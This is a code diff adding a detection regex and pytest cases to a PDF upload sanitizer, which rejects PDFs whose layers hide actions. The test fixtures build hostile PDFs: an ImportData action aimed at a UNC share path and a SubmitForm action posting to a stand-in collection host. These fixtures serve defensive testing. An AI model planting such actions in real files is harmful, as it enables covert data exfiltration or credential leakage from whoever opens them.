@@ -574,12 +574,16 @@ _NAME_END = r"(?![^\s()<>\[\]{}/%])"
 #: What a reader acts on, in an object as MuPDF prints it: an ``/A`` key holding an
 #: action (a dictionary or a reference to one), an additional or open action, a
 #: link target, a page's annotation list, a form, a widget, a name tree, an
-#: outline, or any action dictionary at all.
+#: outline, or any action dictionary at all, its type named in it (``/S /URI``)
+#: or in an object of its own that its ``/S`` references (a line of
+#: :func:`_printed_objects` that is nothing but the type's name).
 _ACTS = re.compile(
     r"/A\s*(?:<<|\d+\s+\d+\s+R)"
     rf"|/(?:AA|OpenAction|URI|Annots|AcroForm|Names|Outlines){_NAME_END}"
     r"|/Subtype\s*/Widget"
     rf"|/S\s*/(?:{'|'.join(_PDF_ACTION_TYPES)}){_NAME_END}"
+    rf"|^\s*/(?:{'|'.join(_PDF_ACTION_TYPES)})\s*$",
+    re.MULTILINE,
 )
 
 
@@ -792,6 +796,109 @@ def test_pdf_still_interactive_after_flattening_rejected_415(
     with pytest.raises(UnsupportedEvidenceError) as excinfo:
         prepare_evidence(upload, filename="certificate.pdf")
     assert excinfo.value.status == 415
+
+
+_LAYER_TEXT = b"/OC /L1 BDC BT /F1 12 Tf 72 720 Td (Degree certificate) Tj ET EMC"
+_LAYER_USAGE = b"/Usage << /View << /ViewState /ON >> /Print << /PrintState /ON >> >>"
+
+
+def _pdf_with_layer(layer_entries: bytes, *extra: bytes) -> bytes:
+    """One page whose text is drawn in an optional-content layer (object 5), shown by default.
+
+    ``layer_entries`` are added to the layer's (OCG) dictionary; ``extra`` objects are
+    numbered from 7. The pages-only rewrite carries the catalog's ``/OCProperties``
+    (``/OCGs`` and ``/D``), so that a layer hidden by default stays hidden, and with
+    it every key of each layer's dictionary; the flatten keeps it too.
+    """
+    return assemble_pdf(
+        [
+            b"<< /Type /Catalog /Pages 2 0 R "
+            b"/OCProperties << /OCGs [5 0 R] /D << /ON [5 0 R] /Order [5 0 R] >> >> >>",
+            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R "
+            b"/Resources << /Font << /F1 6 0 R >> /Properties << /L1 5 0 R >> >> >>",
+            pdf_stream(b"", _LAYER_TEXT),
+            b"<< /Type /OCG /Name (Certificate) " + layer_entries + b" >>",
+            _FONT,
+            *extra,
+        ]
+    )
+
+
+_UNC_FDF = rb"(\\\\evidence-host\\share\\z.fdf)"
+
+
+@pytest.mark.parametrize(
+    ("layer_entries", "extra", "action_type"),
+    [
+        pytest.param(
+            b"/A << /S 7 0 R /F " + _UNC_FDF + b" >>",
+            (b"/ImportData",),
+            "ImportData",
+            id="type-by-reference",
+        ),
+        pytest.param(
+            b"/A << /S 7 0 R /F " + _UNC_FDF + b" >>",
+            (b"8 0 R", b"/ImportData"),
+            "ImportData",
+            id="type-by-reference-chain",
+        ),
+        pytest.param(
+            b"/A 7 0 R",
+            (b"<< /S 8 0 R /F << /FS /URL /F (https://collect.example/form) >> >>", b"/SubmitForm"),
+            "SubmitForm",
+            id="action-and-type-by-reference",
+        ),
+        pytest.param(
+            b"/A << /S /ImportData /F " + _UNC_FDF + b" >>", (), "ImportData", id="type-named"
+        ),
+    ],
+)
+def test_pdf_action_hung_off_a_layer_rejected_415(
+    layer_entries: bytes, extra: tuple[bytes, ...], action_type: str
+) -> None:
+    """An action on a layer's dictionary survives the flatten, so the rescan refuses the file.
+
+    Wave 8 review finding 4: ``/OCProperties`` is kept, and with it each layer's
+    dictionary whole. An action there whose ``/S`` referenced the name
+    ``/ImportData`` (``/S 7 0 R``) was stored, because the rescan matched ``/S``
+    followed by the name only. Whatever object the type's name sits in, it is refused.
+    """
+    upload = _pdf_with_layer(layer_entries, *extra)
+    flattened = _printed_objects(
+        evidence_files._flatten_pdf(evidence_files.canonical_pdf_bytes(upload))
+    )
+    # Non-vacuity: the flatten left the action on the layer; only the rescan stands
+    # between it and the stored file.
+    assert "/Type/OCG" in flattened
+    assert (
+        re.search(rf"^/{action_type}$", flattened, re.MULTILINE) is not None
+        or f"/S/{action_type}" in flattened
+    )
+
+    with pytest.raises(UnsupportedEvidenceError) as excinfo:
+        prepare_evidence(upload, filename="certificate.pdf")
+    assert excinfo.value.status == 415
+    assert excinfo.value.code == "unsupported_evidence_type"
+
+
+def test_pdf_with_a_plain_layer_is_stored_as_it_reads() -> None:
+    """A layer with no action, only the usage hints design tools write, is stored and kept.
+
+    The guard for the rescan of finding 4: optional content alone is not refused, and
+    the stored file reads and renders as the upload did.
+    """
+    upload = _pdf_with_layer(_LAYER_USAGE)
+
+    prepared = prepare_evidence(upload, filename="certificate.pdf")
+
+    assert prepared.content_type == PDF_TYPE
+    assert "/Type/OCG" in _printed_objects(prepared.data)  # the layer was kept, not dropped
+    assert _pages(prepared.data) == 1
+    assert _page_texts(prepared.data) == _page_texts(upload)
+    assert _CERTIFICATE_TEXT in _page_texts(prepared.data)[0]
+    assert _renders(prepared.data) == _renders(upload)
+    assert_inert_pdf(prepared.data)
 
 
 def test_pdf_flattened_over_the_cap_rejected_413(monkeypatch: pytest.MonkeyPatch) -> None:
